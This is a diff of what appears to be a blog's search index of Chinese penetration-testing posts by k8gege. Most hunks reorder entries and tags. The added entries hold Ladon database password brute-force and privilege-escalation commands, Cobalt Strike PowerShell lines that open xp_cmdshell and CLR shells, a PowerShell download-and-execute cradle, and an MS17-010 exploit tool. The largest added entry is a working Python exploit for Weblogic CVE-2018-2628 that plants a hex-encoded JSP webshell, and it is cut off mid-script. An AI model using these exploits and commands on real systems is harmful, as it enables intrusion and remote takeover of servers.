@@ -3303,46 +3303,6 @@ window.location.href="https://k8gege.org/Ladon/OracleScan.html";
       </tags>
   </entry>
   <entry>
-    <title>Ladon渗透Mysql数据库一键提权 密码爆破</title>
-    <url>/p/MysqlScan.html</url>
-    <content><![CDATA[<p style="color:#fff;"> 
-<% <span class="archive-article-date">
-Visit <span id="busuanzi_value_page_pv"></span>
-
-%>
-</%></p>
-
-<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
-<script language="javascript" type="text/javascript">
-window.location.href="https://k8gege.org/Ladon/MysqlScan.html";
-</script>
-
-
-<h3 id="3306端口-Mysql数据库密码爆破"><a href="#3306端口-Mysql数据库密码爆破" class="headerlink" title="3306端口 Mysql数据库密码爆破"></a>3306端口 Mysql数据库密码爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 MysqlScan</span><br></pre></td></tr></table></figure>
-
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/MysqlScan_up.png"></p>
-<h4 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h4><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认</p>
-<p>user.txt和pass.txt分别存放用户、密码<br>userpass.txt存放用户密码组，即每行存放用户以及密码<br>check.txt每行存放IP\端口\用户\密码</p>
-<h4 id="数据库口令检测"><a href="#数据库口令检测" class="headerlink" title="数据库口令检测"></a>数据库口令检测</h4><h5 id="mssql密码验证"><a href="#mssql密码验证" class="headerlink" title="mssql密码验证"></a>mssql密码验证</h5><p>(大型内网可能从其它机器收集到大量机器密码，第一步肯定是先验证)<br>非默认端口请将以下端口改成被修改端口即可，单个IP可直接Ladon IP:端口 MssqlScan扫描<br>check.txt<br>192.168.1.8 1433 master sa k8gege<br>192.168.1.8 sa k8gege<br>192.168.1.8 1433 sa k8gege<br>命令: Ladon MssqlScan</p>
-<h5 id="Oracle同理"><a href="#Oracle同理" class="headerlink" title="Oracle同理"></a>Oracle同理</h5><p>192.168.1.8 1521 orcl system k8gege<br>192.168.1.8 orcl system k8gege<br>192.168.1.8 system k8gege<br>命令: Ladon OrcleScan</p>
-<h5 id="Mysql无需指定数据库名"><a href="#Mysql无需指定数据库名" class="headerlink" title="Mysql无需指定数据库名"></a>Mysql无需指定数据库名</h5><p>192.168.1.8 3306 root k8gege<br>192.168.1.8 root k8gege<br>命令: Ladon MssqlScan</p>
-<h3 id="PowerLadon"><a href="#PowerLadon" class="headerlink" title="PowerLadon"></a>PowerLadon</h3><h4 id="远程加载MysqlScan-1521端口弱口令爆破"><a href="#远程加载MysqlScan-1521端口弱口令爆破" class="headerlink" title="远程加载MysqlScan 1521端口弱口令爆破"></a>远程加载MysqlScan 1521端口弱口令爆破</h4><p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.3:800/Ladon.ps1&#39;" target="_blank" rel="noopener">http://192.168.1.3:800/Ladon.ps1&#39;</a>); Ladon 192.168.1.141 MysqlScan”</p>
-<h3 id="Kali、Linux、Mac、路由器等操作系统"><a href="#Kali、Linux、Mac、路由器等操作系统" class="headerlink" title="Kali、Linux、Mac、路由器等操作系统"></a>Kali、Linux、Mac、路由器等操作系统</h3><p>./Ladon 192.168.1.8/24 MysqlScan<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/MysqlScan_up.png"></p>
-<h3 id="Mysql数据库远程提权工具"><a href="#Mysql数据库远程提权工具" class="headerlink" title="Mysql数据库远程提权工具"></a>Mysql数据库远程提权工具</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/MysqlStudy.png"></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/MysqlCmd.png"></p>
-<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
-<div style="text-align: center; width: 710px; border: green solid 0px;">
-<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="https://k8gege.org/img/k8team.jpg">
-</div>]]></content>
-      <categories>
-        <category>Ladon</category>
-      </categories>
-      <tags>
-        <tag>Ladon</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Ladon渗透SQL Server数据库一键提权 密码爆破</title>
     <url>/p/MssqlScan.html</url>
     <content><![CDATA[<p style="color:#fff;"> 
@@ -3373,6 +3333,46 @@ window.location.href="https://k8gege.org/Ladon/MssqlScan.html";
 <p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/MssqlCmd.png"></p>
 <h4 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">本机:</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host info</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host open_shell</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host close_shell</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host xp_cmdshell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host ws_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host r_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host py_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host install_clr</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host uninstall_clr</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host clr_exec cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host clr_efspotato cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host clr_badpotato cmdline</span><br><span class="line"></span><br><span class="line">远程:</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master info</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host port user pass master open_shell</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host port user pass master close_shell</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master xp_cmdshell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master ws_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master r_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master py_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master install_clr</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master uninstall_clr</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master clr_exec cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master clr_efspotato cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master clr_badpotato cmdline</span><br></pre></td></tr></table></figure>
 
+<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
+<div style="text-align: center; width: 710px; border: green solid 0px;">
+<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="https://k8gege.org/img/k8team.jpg">
+</div>]]></content>
+      <categories>
+        <category>Ladon</category>
+      </categories>
+      <tags>
+        <tag>Ladon</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ladon渗透Mysql数据库一键提权 密码爆破</title>
+    <url>/p/MysqlScan.html</url>
+    <content><![CDATA[<p style="color:#fff;"> 
+<% <span class="archive-article-date">
+Visit <span id="busuanzi_value_page_pv"></span>
+
+%>
+</%></p>
+
+<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
+<script language="javascript" type="text/javascript">
+window.location.href="https://k8gege.org/Ladon/MysqlScan.html";
+</script>
+
+
+<h3 id="3306端口-Mysql数据库密码爆破"><a href="#3306端口-Mysql数据库密码爆破" class="headerlink" title="3306端口 Mysql数据库密码爆破"></a>3306端口 Mysql数据库密码爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 MysqlScan</span><br></pre></td></tr></table></figure>
+
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/MysqlScan_up.png"></p>
+<h4 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h4><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认</p>
+<p>user.txt和pass.txt分别存放用户、密码<br>userpass.txt存放用户密码组，即每行存放用户以及密码<br>check.txt每行存放IP\端口\用户\密码</p>
+<h4 id="数据库口令检测"><a href="#数据库口令检测" class="headerlink" title="数据库口令检测"></a>数据库口令检测</h4><h5 id="mssql密码验证"><a href="#mssql密码验证" class="headerlink" title="mssql密码验证"></a>mssql密码验证</h5><p>(大型内网可能从其它机器收集到大量机器密码，第一步肯定是先验证)<br>非默认端口请将以下端口改成被修改端口即可，单个IP可直接Ladon IP:端口 MssqlScan扫描<br>check.txt<br>192.168.1.8 1433 master sa k8gege<br>192.168.1.8 sa k8gege<br>192.168.1.8 1433 sa k8gege<br>命令: Ladon MssqlScan</p>
+<h5 id="Oracle同理"><a href="#Oracle同理" class="headerlink" title="Oracle同理"></a>Oracle同理</h5><p>192.168.1.8 1521 orcl system k8gege<br>192.168.1.8 orcl system k8gege<br>192.168.1.8 system k8gege<br>命令: Ladon OrcleScan</p>
+<h5 id="Mysql无需指定数据库名"><a href="#Mysql无需指定数据库名" class="headerlink" title="Mysql无需指定数据库名"></a>Mysql无需指定数据库名</h5><p>192.168.1.8 3306 root k8gege<br>192.168.1.8 root k8gege<br>命令: Ladon MssqlScan</p>
+<h3 id="PowerLadon"><a href="#PowerLadon" class="headerlink" title="PowerLadon"></a>PowerLadon</h3><h4 id="远程加载MysqlScan-1521端口弱口令爆破"><a href="#远程加载MysqlScan-1521端口弱口令爆破" class="headerlink" title="远程加载MysqlScan 1521端口弱口令爆破"></a>远程加载MysqlScan 1521端口弱口令爆破</h4><p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.3:800/Ladon.ps1&#39;" target="_blank" rel="noopener">http://192.168.1.3:800/Ladon.ps1&#39;</a>); Ladon 192.168.1.141 MysqlScan”</p>
+<h3 id="Kali、Linux、Mac、路由器等操作系统"><a href="#Kali、Linux、Mac、路由器等操作系统" class="headerlink" title="Kali、Linux、Mac、路由器等操作系统"></a>Kali、Linux、Mac、路由器等操作系统</h3><p>./Ladon 192.168.1.8/24 MysqlScan<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/MysqlScan_up.png"></p>
+<h3 id="Mysql数据库远程提权工具"><a href="#Mysql数据库远程提权工具" class="headerlink" title="Mysql数据库远程提权工具"></a>Mysql数据库远程提权工具</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/MysqlStudy.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/MysqlCmd.png"></p>
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
 <img alt style="display: inline-block;width: 250px;height: 300px;" data-original="https://k8gege.org/img/k8team.jpg">
@@ -5211,8 +5211,8 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all-code-1.7.jar CommonsCollections2 &quot;co
         <category>Ladon</category>
       </categories>
       <tags>
-        <tag>信息收集</tag>
         <tag>Exchange</tag>
+        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -5237,8 +5237,8 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all-code-1.7.jar CommonsCollections2 &quot;co
         <category>Ladon</category>
       </categories>
       <tags>
-        <tag>信息收集</tag>
         <tag>Exchange</tag>
+        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -6281,8 +6281,8 @@ window.location.href="https://k8gege.org/Ladon/netsh.html";
         <category>Exp</category>
       </categories>
       <tags>
-        <tag>Exchange</tag>
         <tag>CVE-2020-17144</tag>
+        <tag>Exchange</tag>
       </tags>
   </entry>
   <entry>
@@ -8144,8 +8144,8 @@ window.location.href="https://k8gege.org/Ladon/sshscan.html";
 <p>注意：我这里说的是不推荐用MSF中的PowerShell加载模块，并不是说MSF。<br>如同说霍金身体残废，但却没有说他是废人哦，何况只是说他一只手受伤。</p>
 ]]></content>
       <categories>
-        <category>.NET</category>
         <category>Metasploit</category>
+        <category>.NET</category>
         <category>PowerShell</category>
       </categories>
       <tags>
@@ -8791,8 +8791,8 @@ Microsoft Windows 10 for 32-bit Systems 0
 <p><span style="font-size: 14px;"><a href="https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike%20%26%20Metasploit%20Shellcode%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7).rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike &amp; Metasploit Shellcode免杀工具).rar</a></span></p>]]></content>
       <categories>
         <category>工具</category>
-        <category>免杀</category>
         <category>Cobalt Strike</category>
+        <category>免杀</category>
         <category>Metasploit</category>
         <category>ShellCode</category>
       </categories>
@@ -8935,8 +8935,8 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>Ladon</category>
         <category>工具</category>
         <category>源码</category>
-        <category>Python</category>
         <category>编程</category>
+        <category>Python</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -9085,8 +9085,8 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
 <p>基本都是白名单加载DLL，DLL释放各种加密文件，再解密执行，最终加载CS而已。</p>]]></content>
       <categories>
         <category>工具</category>
-        <category>免杀</category>
         <category>Cobalt Strike</category>
+        <category>免杀</category>
         <category>Metasploit</category>
         <category>ShellCode</category>
         <category>Python</category>
@@ -9096,6 +9096,33 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
         <tag>Cobalt Strike</tag>
         <tag>Metasploit</tag>
         <tag>BypassAV</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SMB溢出工具加强版</title>
+    <url>/p/68a8bf1b.html</url>
+    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
+<p><strong>编译:</strong>python</p>
+<p><strong>漏洞:</strong>MS17-010</p>
+<p><strong>用法:</strong></p>
+<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
+<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
+<p><strong>内网批量</strong></p>
+<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
+<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
+<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
+<p><img alt data-original="https://k8gege.org/k8img/posts/k8zzz.png"></p>
+<p>&nbsp;</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>MS17010</tag>
+        <tag>SMB</tag>
       </tags>
   </entry>
   <entry>
@@ -9192,36 +9219,9 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
       </categories>
       <tags>
         <tag>Exp</tag>
+        <tag>Code</tag>
         <tag>Tool</tag>
         <tag>GetShell</tag>
-        <tag>Code</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SMB溢出工具加强版</title>
-    <url>/p/68a8bf1b.html</url>
-    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
-<p><strong>编译:</strong>python</p>
-<p><strong>漏洞:</strong>MS17-010</p>
-<p><strong>用法:</strong></p>
-<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
-<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
-<p><strong>内网批量</strong></p>
-<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
-<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
-<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/k8zzz.png"></p>
-<p>&nbsp;</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>提权</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>MS17010</tag>
-        <tag>SMB</tag>
       </tags>
   </entry>
   <entry>
@@ -9429,6 +9429,55 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
       </tags>
   </entry>
   <entry>
+    <title>CVE-2018-2628 Weblogic GetShell Exploit</title>
+    <url>/p/b8e58f69.html</url>
+    <content><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
+<hr>
+<ul>
+<li>漏洞威胁：RCE--远程代码执行</li>
+<li>漏洞组件：weblogic</li>
+<li>影响版本：10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</li>
+</ul>
+<h2 class="brush:python;gutter:true;"><br><strong>代码:</strong> </h2>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;"># -*- coding: utf-8 -*-
+# Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)
+
+<p>from <strong>future</strong> import print_function</p>
+<p>import binascii<br>import os<br>import socket<br>import sys<br>import time</p>
+<p>def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</p>
+<pre><code>#k8cmd weblogic http://192.11.22.67:7001/bea_wls_internal/wlscmd.jsp
+return &quot;aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e66696c6575706c6f61642e6469736b2e4469736b46696c654974656d1f0d7226839a887103000a5a000b6973466f726d4669656c644a000473697a6549000d73697a655468726573686f6c645b000d636163686564436f6e74656e747400025b424c000b636f6e74656e74547970657400124c6a6176612f6c616e672f537472696e673b4c000864666f7346696c6574000e4c6a6176612f696f2f46696c653b4c00096669656c644e616d6571007e00024c000866696c654e616d6571007e00024c00076865616465727374002f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c000a7265706f7369746f727971007e0003787000ffffffffffffffff00000000757200025b42acf317f8060854e00200007870000002d43c25407061676520696d706f72743d226a6176612e696f2e2a22253e0d0a3c25407061676520696d706f72743d2273756e2e6d6973632e4241534536344465636f64657222253e0d0a3c250d0a747279207b0d0a537472696e6720636d64203d20726571756573742e676574506172616d657465722822746f6d22293b0d0a537472696e6720706174683d6170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574526571756573745552492829293b0d0a537472696e67206469723d227765626c6f676963223b0d0a696628636d642e657175616c7328224e7a55314e672229297b6f75742e7072696e7428225b535d222b6469722b225b455d22293b7d0d0a627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f646542756666657228636d64293b0d0a537472696e67206b636d64203d206e657720537472696e672862696e617279293b0d0a50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b0d0a496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b0d0a6f75742e7072696e7428222d3e7c22293b0d0a696e7420633b0d0a7768696c6520282863203d20696e2e7265616428292920213d202d3129207b0d0a6f75742e7072696e742828636861722963293b0d0a7d0d0a696e2e636c6f736528293b0d0a6f75742e7072696e7428227c3c2d22293b0d0a747279207b0d0a6368696c642e77616974466f7228293b0d0a7d2063617463682028496e746572727570746564457863657074696f6e206529207b0d0a652e7072696e74537461636b547261636528293b0d0a7d0d0a7d2063617463682028494f457863657074696f6e206529207b0d0a53797374656d2e6572722e7072696e746c6e2865293b0d0a7d0d0a253e7400186170706c69636174696f6e2f6f637465742d73747265616d707400047465737471007e0009707372000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e0002787074004d736572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c776c73636d642e6a7370c0807702005c7878&quot;</code></pre><p>def t3_handshake(sock, server_addr):<br>    sock.connect(server_addr)<br>    sock.send(‘74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a’.decode(‘hex’))<br>    time.sleep(1)<br>    sock.recv(1024)<br>    print(‘handshake successful’)</p>
+<p>def build_t3_request_object(sock, port):<br>    data1 = ‘000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371’<br>    data2 = ‘007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07’.format(‘{:04x}’.format(dport))<br>    data3 = ‘1a7727000d3234322e323134’<br>    data4 = ‘2e312e32353461863d1d0000000078’<br>    for d in [data1,data2,data3,data4]:<br>        sock.send(d.decode(‘hex’))<br>    time.sleep(2)<br>    print(‘send request payload successful,recv length:%d’%(len(sock.recv(2048))))</p>
+<p>def send_payload_objdata(sock, data):<br>    payload=’056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000’<br>    payload+=data<br>    payload+=’fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff’<br>    payload = ‘%s%s’%(‘{:08x}’.format(len(payload)/2 + 4),payload)<br>    sock.send(payload.decode(‘hex’))<br>    time.sleep(2)<br>    sock.send(payload.decode(‘hex’))<br>    res = ‘’<br>    try:<br>        while True:<br>            res += sock.recv(4096)<br>            time.sleep(0.1)<br>    except Exception:<br>        pass<br>    return res</p>
+<p>def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):<br>    print(‘——————————————–’)<br>    print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>    print(‘by k8gege build 20180426’)<br>    print(‘——————————————–’)<br>    print(“sending payload”);<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.settimeout(8)<br>    server_addr = (dip, dport)<br>    t3_handshake(sock, server_addr)<br>    build_t3_request_object(sock, dport)<br>    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</p>
+<pre><code>rs=send_payload_objdata(sock, payload)
+#print(&apos;response: &apos; + rs)
+print(&apos;exploit completed!&apos;)
+print(&apos;shell: http://&apos;+dip+&apos;:&apos;+str(dport)+&quot;/bea_wls_internal/wlscmd.jsp&quot;)
+print(&apos;Please use the k8fly connection shell&apos;)</code></pre><p>if <strong>name</strong>==”<strong>main</strong>“:<br>    if len(sys.argv) != 3:<br>        print(‘——————————————–’)<br>        print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>        print(‘by k8gege build 20180426’)<br>        print(‘Usage: exploit [weblogic ip] [weblogic port]’)<br>        print(‘——————————————–’)<br>        sys.exit()</p>
+<pre><code>dip = sys.argv[1]
